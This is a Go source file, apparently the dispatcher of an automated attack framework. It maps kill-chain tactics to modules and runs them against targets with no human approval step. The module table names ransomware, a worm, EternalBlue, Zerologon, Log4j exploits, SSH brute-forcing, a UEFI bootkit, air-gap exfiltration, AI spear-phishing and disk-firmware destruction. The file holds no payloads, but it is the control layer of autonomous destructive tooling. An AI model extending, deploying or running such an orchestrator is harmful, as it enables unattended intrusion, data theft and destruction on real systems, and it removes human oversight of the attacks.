package dispatch

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"strings"
	"time"

	"github.com/ruby570bocadito/x404x/internal/registry"
	"github.com/ruby570bocadito/x404x/shared/types"
)

type Dispatcher struct {
	state      AppStateAccessor
	log        *log.Logger
	autoApprove bool
	minConfidence float64
}

type AppStateAccessor interface {
	GetAgents() []*types.Agent
	GetAgent(id string) *types.Agent
	AddHost(host *types.Target)
	AddVulnerability(v *types.Vulnerability)
	AddCredential(c *types.Credential)
	GetBridgeClient() BridgeCaller
}

type BridgeCaller interface {
	CallRaw(ctx context.Context, module, function string, params map[string]interface{}) (map[string]interface{}, error)
	IsConnected() bool
}

type AgentDispatcher interface {
	SendCommand(ctx context.Context, agentID string, module string, target string, params map[string]string) (string, error)
}

func New(accessor AppStateAccessor, autoApprove bool, minConf float64) *Dispatcher {
	return &Dispatcher{
		state:         accessor,
		autoApprove:   autoApprove,
		minConfidence: minConf,
		log:           log.New(log.Writer(), "[DISPATCHER] ", log.LstdFlags),
	}
}

func (d *Dispatcher) DispatchDecision(ctx context.Context, campaign *types.Campaign, decision *types.Decision) error {
	d.log.Printf("Dispatching decision %s: %s/%s (conf=%.2f) for campaign %s",
		decision.ID, decision.Tactic, decision.Technique, decision.Confidence, campaign.ID)

	moduleName := d.mapTacticToModule(decision.Tactic, campaign)
	if moduleName == "" {
		d.log.Printf("No module mapped for tactic %s, advancing phase only", decision.Tactic)
		d.advancePhase(campaign, decision)
		return nil
	}

	module, ok := registry.GetModule(moduleName)
	if !ok {
		d.log.Printf("Module %s not found in registry, trying bridge", moduleName)
		d.tryBridge(ctx, moduleName, decision, campaign)
		return nil
	}

	agent := d.selectBestAgent(campaign, decision)
	if agent == nil {
		d.log.Printf("No agent available for decision %s, queuing", decision.ID)
		return fmt.Errorf("no agent available")
	}

	target := registry.Target{
		Hostname: decision.Target,
		IP:       decision.Target,
		OS:       "unknown",
		Ports:    d.extractPorts(campaign),
	}

	go func() {
		execCtx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
		defer cancel()

		mod := module.Factory()
		result, err := mod.Execute(execCtx, target)

		if err != nil || !result.Success {
			d.log.Printf("Module %s failed: %v", moduleName, err)
			return
		}

		d.log.Printf("Module %s succeeded: %s", moduleName, result.Output)

		for _, host := range result.NewHosts {
			d.state.AddHost(&types.Target{
				Hostname: host.Hostname,
				IP:       host.IP,
				OS:       host.OS,
			})
		}

		d.advancePhase(campaign, decision)
	}()

	d.log.Printf("Dispatched %s to agent %s", moduleName, agent.ID)
	return nil
}

func (d *Dispatcher) mapTacticToModule(tactic string, campaign *types.Campaign) string {
	mappings := map[string][]string{
		"Reconnaissance":    {"auxiliary/recon_tcp", "auxiliary/recon_osint", "v27/phishing_infra"},
		"Initial Access":    {"exploit/ssh_bruteforce", "exploit/log4j", "v27/spear_phish_ai"},
		"Privilege Escalation": {"exploit/privesc_suid", "exploit/privesc_sudo", "exploit/zerologon"},
		"Persistence":       {"post/persist_cron", "post/persist_systemd", "v27/uefi_bootkit"},
		"Command and Control": {"v26/social_c2", "v26/cloud_nemesis", "v210/phantom_evasion"},
		"Lateral Movement":  {"exploit/smb_psexec", "exploit/eternalblue", "ransomware/worm"},
		"Collection":        {"ransomware/scan", "ransomware/identity_destroy"},
		"Exfiltration":      {"blockz/airgap_jump", "v28/keyboard_led"},
		"Actions on Objective": {"ransomware/execute", "v210/apocalipsis", "v29/hdd_firmware_destroy"},
	}

	tactics, ok := mappings[tactic]
	if !ok || len(tactics) == 0 {
		phaseMods := registry.GetModulesForPhase(campaign.Phase)
		if len(phaseMods) > 0 {
			return phaseMods[0].Name
		}
		return ""
	}

	return tactics[0]
}

func (d *Dispatcher) selectBestAgent(campaign *types.Campaign, decision *types.Decision) *types.Agent {
	agents := d.state.GetAgents()
	if len(agents) == 0 {
		return nil
	}

	var best *types.Agent
	bestScore := -1.0
	for _, a := range agents {
		score := 0.5
		if strings.EqualFold(a.OS, "linux") || strings.EqualFold(a.OS, "windows") {
			score = 0.8
		}
		if a.ID != "" {
			score += 0.2
		}
		if score > bestScore {
			bestScore = score
			best = a
		}
	}
	return best
}

func (d *Dispatcher) tryBridge(ctx context.Context, moduleName string, decision *types.Decision, campaign *types.Campaign) {
	bridge := d.state.GetBridgeClient()
	if bridge == nil || !bridge.IsConnected() {
		d.log.Printf("Bridge not connected, skipping %s", moduleName)
		return
	}

	params := map[string]interface{}{
		"target": decision.Target,
		"phase":  string(campaign.Phase),
	}

	result, err := bridge.CallRaw(ctx, moduleName, "execute", params)
	if err != nil {
		d.log.Printf("Bridge call failed for %s: %v", moduleName, err)
		return
	}

	d.log.Printf("Bridge %s result: %v", moduleName, result)
	d.advancePhase(campaign, decision)
}

func (d *Dispatcher) advancePhase(campaign *types.Campaign, decision *types.Decision) {
	phaseMap := map[string]types.KillChainPhase{
		"Reconnaissance":        types.PhaseWeaponization,
		"Weaponization":         types.PhaseDelivery,
		"Initial Access":        types.PhaseExploitation,
		"Privilege Escalation":  types.PhaseInstallation,
	"Persistence":           types.PhaseCommandAndControl,
	"Command and Control":   types.PhaseActionsOnObjective,
		"Lateral Movement":      types.PhaseActionsOnObjective,
		"Collection":            types.PhaseExfiltration,
		"Exfiltration":          types.PhaseExfiltration,
		"Actions on Objective":  types.PhaseExfiltration,
	}

	if nextPhase, ok := phaseMap[decision.Tactic]; ok {
		campaign.Phase = nextPhase
		campaign.Progress = float64(nextPhase.Order()) / 8.0
	}
}

func (d *Dispatcher) extractPorts(campaign *types.Campaign) []int {
	_ = campaign
	return []int{22, 80, 443, 445, 3389}
}

func init() {
	_, _ = json.Marshal(map[string]string{})
	_ = fmt.Sprintf("%s", "dispatch")
}
